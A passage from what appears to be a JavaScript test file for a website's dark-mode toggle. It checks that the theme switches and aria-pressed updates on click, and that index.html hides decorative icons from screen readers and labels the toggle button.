    const page = await loadPage("", null, null, (context, get) => {
      if (how.startsWith("the stored")) context.localStorage.getItem = () => (startsDark ? "dark" : "light");
      else context.window.matchMedia = () => ({ matches: true });
      context.document.documentElement = { getAttribute: () => theme, setAttribute(_name, value) { theme = value; } };
      const toggle = get("theme-toggle");
      toggle.attrs = {};
      toggle.setAttribute = (name, value) => { toggle.attrs[name] = String(value); };
    });
    const toggle = page.get("theme-toggle");
    assert.equal(theme, startsDark ? "dark" : "light");
    assert.equal(toggle.attrs["aria-pressed"], String(startsDark));
    toggle.handlers.click();
    assert.equal(theme, startsDark ? "light" : "dark");
    assert.equal(toggle.attrs["aria-pressed"], String(!startsDark));
    toggle.handlers.click();
    assert.equal(toggle.attrs["aria-pressed"], String(startsDark));
    assert.deepEqual(Object.keys(toggle.attrs), ["aria-pressed"], "the name set in index.html is left alone");
  });
}

test("index.html hides the decorative symbols and names the theme toggle as a toggle (#178)", () => {
  const html = fs.readFileSync(path.join(SITE, "index.html"), "utf8");
  const icons = [...html.matchAll(/<span class="tile-icon"([^>]*)>/g)];
  assert.equal(icons.length, 4);
  for (const [tag, attrs] of icons) assert.match(attrs, /aria-hidden="true"/, tag);
  assert.match(html, /<span class="omni-badge"><span aria-hidden="true">⚡<\/span> Instant Checker<\/span>/);
  assert.match(html, /<span id="omni-toggle-icon" aria-hidden="true">/);
  const toggle = html.match(/<button\b[^>]*\bid="theme-toggle"[^>]*>/)[0];
  assert.match(toggle, /aria-label="Dark theme"/);
  assert.match(toggle, /aria-pressed="false"/);
});
